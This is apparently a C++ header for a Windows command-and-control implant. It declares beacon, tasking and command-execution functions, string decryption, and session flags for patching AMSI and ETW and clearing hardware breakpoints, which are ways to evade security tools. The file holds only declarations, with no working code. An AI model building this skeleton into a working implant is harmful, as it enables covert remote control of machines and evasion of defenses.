#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include "config.hpp"

struct Session {
    std::wstring sessionId;
    std::wstring hostname;
    std::wstring username;
    DWORD build;
    BOOL  elevated;
    BOOL  amsiPatched;
    BOOL  etwPatched;
    BOOL  hwbpsCleared;
};

BOOL  PingC2();
DWORD BeaconLoop(const Session& session);
BOOL SendBeacon(const Session& session, std::wstring& taskOut);
BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
std::wstring ExecuteCommand(const std::wstring& cmd);
std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key);